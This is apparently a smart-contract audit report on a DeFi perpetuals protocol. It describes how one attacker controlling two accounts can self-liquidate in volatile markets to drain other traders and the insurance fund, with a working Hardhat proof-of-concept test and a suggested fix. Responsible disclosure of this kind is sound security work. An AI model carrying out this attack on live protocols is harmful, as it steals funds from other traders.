# market can be abused during times of high volatility

## Summary
If the market is volatile, positions just at margin can be abused using liquidations to steal from other traders/insurance

## Vulnerability Detail
To open a position your net value (position + credit) must be above `maintenanceMargin`:

https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Liquidation.sol#L100-L103
```solidity
File: smart-contract-EVM/contracts/lib/Liquidation.sol

100:            netPositionValue +
101:                state.primaryCredit[trader] +
102:                SafeCast.toInt256(state.secondaryCredit[trader]) >=
103:            SafeCast.toInt256(maintenanceMargin);
```

Now here it's assumed that a trader doesn't want to be liquidated. But if the market is volatile and both sides are just different accounts by the same attacker this attacker can use this to liquidate at the expense of other traders/insurance.

PoC test in `trade-test.ts`:
```javascript
    it("gain from liquidation", async () => {
      let ada = new ethers.Wallet("0x1111111111111111111111111111111111111111111111111111111111111111", ethers.provider);
      await ethers.provider.send("hardhat_setBalance", [ada.address,"0x10000000000000000000",]);
      await context.primaryAsset.connect(ada).approve(context.dealer.address, utils.parseEther("1000"));
      await context.primaryAsset.mint([ada.address], [utils.parseEther("1000")]);

      let bob = new ethers.Wallet("0x2222222222222222222222222222222222222222222222222222222222222222", ethers.provider);
      await ethers.provider.send("hardhat_setBalance", [bob.address,"0x10000000000000000000",]);
      await context.primaryAsset.connect(bob).approve(context.dealer.address, utils.parseEther("1000"));
      await context.primaryAsset.mint([bob.address], [utils.parseEther("1000")]);

      await context.dealer.connect(ada).deposit(utils.parseEther("1000"), 0, ada.address);
      await context.dealer.connect(bob).deposit(utils.parseEther("1000"), 0, bob.address);

      // open at market price
      await openPosition(
        ada,
        bob,
        "1",
        "30000",
        context.perpList[0],
        orderEnv
      );

      // price changes a bit
      await context.priceSourceList[0].setMarkPrice(utils.parseEther("31000"));

      // bob is no longer safe
      await context.perpList[0].connect(ada).liquidate(
        ada.address,
        bob.address,
        utils.parseEther("-1"),
        utils.parseEther("31000")
      );

      // ada has made more than both her and bobs deposits together
      // i.e. "stolen" from other traders/insurance
      const credit = await context.dealer.getCreditOf(ada.address);
      expect(credit[0]).to.be.eq(utils.parseEther("2295"));
    });
```
This example works the same way if the price falls, then `ada` is no longer safe and `bob` can liquidate with the same result.

This also relies on that they can do the liquidation before anyone else which is a risk with this setup. But since they have the advantage of knowing exactly which positions to cover they can setup a bot to monitor this.

## Impact
A trader can place orders in a volatile market making liquidations at the expense of other traders/insurance. This is not without risk as anyone can do these liquidations.

The PoC above ofc relies on the configuration set in the tests but the principle holds. As long as the volatility is "greater than" the maintenance margin there is an opportunity for this attack. The maintenance margin really cannot be changed (at least not raised) once set either as that would have impacts on other traders positions and might force them into liquidation.

There will also be a bit of a lead to when to start this attack as the prices used in the protocol are TWAP. Someone looking to abuse this can lock at spot trade prices and foresee when the volatility might happen.

## Code Snippet
See above.

## Tool used
Manual Review

## Recommendation
Hard to say here, perhaps a safety margin on top of the normal margin. Or a minimum desposit depending on trading size. That would increase the risk of doing this attack since it also relies on being able to be first with liquidation.
